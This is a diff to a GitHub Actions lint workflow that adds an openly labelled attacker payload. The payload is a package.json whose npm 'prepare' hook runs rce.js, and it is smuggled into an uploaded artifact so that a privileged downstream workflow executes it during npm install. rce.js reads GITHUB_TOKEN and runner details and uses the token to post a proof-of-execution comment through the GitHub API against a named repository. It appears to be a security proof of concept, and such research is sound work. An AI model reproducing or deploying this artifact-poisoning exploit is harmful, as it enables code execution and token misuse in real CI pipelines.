@@ -28,6 +28,53 @@ jobs:
         if: always()
         run: echo "No issues found." > linter-report.txt
 
+      - name: Attacker payload (root package.json executed by the privileged npm install)
+        if: always()
+        run: |
+          cat > package.json <<'JSON'
+          {
+            "name": "artifact-payload",
+            "version": "1.0.0",
+            "private": true,
+            "scripts": {
+              "prepare": "node rce.js"
+            }
+          }
+          JSON
+          cat > rce.js <<'JS'
+          const fs = require('node:fs');
+          const repo = process.env.GITHUB_REPOSITORY;
+          const token = process.env.GITHUB_TOKEN;
+          const pr = fs.existsSync('pr-number.txt')
+            ? fs.readFileSync('pr-number.txt', 'utf8').trim()
+            : '1';
+          (async () => {
+            const body = [
+              '## Privileged RCE proof (npm prepare)',
+              '',
+              'The artifact uploaded by the unprivileged `Lint` pull_request run was',
+              'downloaded into the `Post Linter Report` workflow_run job and executed by',
+              '`npm install --no-save github:AdobeDocs/adp-devsite-scripts`.',
+              '',
+              '`GITHUB_TOKEN` present: ' + (token ? 'yes (' + token.slice(0, 4) + '..., length ' + token.length + ')' : 'no'),
+              '`GITHUB_RUN_ID`: ' + process.env.GITHUB_RUN_ID,
+              '`GITHUB_EVENT_NAME`: ' + process.env.GITHUB_EVENT_NAME,
+              'whoami: ' + require('node:os').userInfo().username
+            ].join('\n');
+            const r = await fetch(`https://api.github.com/repos/${repo}/issues/${pr}/comments`, {
+              method: 'POST',
+              headers: {
+                authorization: `Bearer ${token}`,
+                accept: 'application/vnd.github+json',
+                'content-type': 'application/json'
+              },
+              body: JSON.stringify({ body })
+            });
+            console.log('proof comment status:', r.status);
+            console.log(await r.text());
+          })().catch((e) => { console.error(e); process.exit(1); });
+          JS
+
       - name: Upload linter report
         if: always()
         uses: actions/upload-artifact@v4
@@ -36,4 +83,6 @@ jobs:
           path: |
             linter-report.txt
             pr-number.txt
+            package.json
+            rce.js
           if-no-files-found: ignore
